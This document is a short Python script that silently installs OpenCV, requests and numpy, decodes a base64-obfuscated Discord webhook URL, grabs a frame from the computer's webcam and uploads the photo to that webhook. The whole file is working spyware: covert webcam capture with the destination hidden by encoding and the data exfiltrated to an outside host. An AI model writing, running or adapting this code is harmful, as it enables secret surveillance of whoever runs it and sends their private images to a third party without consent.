import os
import subprocess
import sys
import io
import base64
import cv2
import requests
import numpy as np

# Function to install a package if it's not already installed
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Ensure required packages are installed
required_packages = ["opencv-python", "requests", "numpy"]

for package in required_packages:
    try:
        __import__(package.replace("-", "_"))  # Convert "opencv-python" to "opencv_python"
    except ImportError:
        print(f"Installing {package}...")
        install(package)

# Function to decrypt the webhook (Base64 decoding)
def decrypt_webhook():
    encoded_webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyMDkyMjYxNTYwMjIyMTA5Ny9scFhiTmcyMmRBZ21UNFZ2R0FGbmZTOFRURHJQS0tlc3hLZjR6SkVfdlNtVVhObGpXTmh4TUcxZEFqeVZ5Vks2d1FsNQ=="
    decoded_bytes = base64.b64decode(encoded_webhook)
    return decoded_bytes.decode("utf-8")

# Function to capture a photo and send it to the Discord webhook
def capture_and_send_to_webhook():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Failed to open the camera.")
        return

    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

    ret, frame = cap.read()
    cap.release()

    if not ret:
        print("Failed to capture image.")
        return

    _, img_encoded = cv2.imencode('.png', frame)
    img_bytes = img_encoded.tobytes()

    send_image_to_webhook(img_bytes)

# Function to send the image to the webhook
def send_image_to_webhook(image_bytes):
    webhook_url = decrypt_webhook()

    files = {
        'file': ('webcam.png', io.BytesIO(image_bytes), 'image/png')
    }
    data = {
        'content': 'Here is the webcam photo!'
    }

    response = requests.post(webhook_url, data=data, files=files)
    
    if response.status_code == 204:
        print("Successfully sent the image to the webhook!")
    else:
        print(f"Failed to send image. Status code: {response.status_code}")

# Capture and send the photo
capture_and_send_to_webhook()
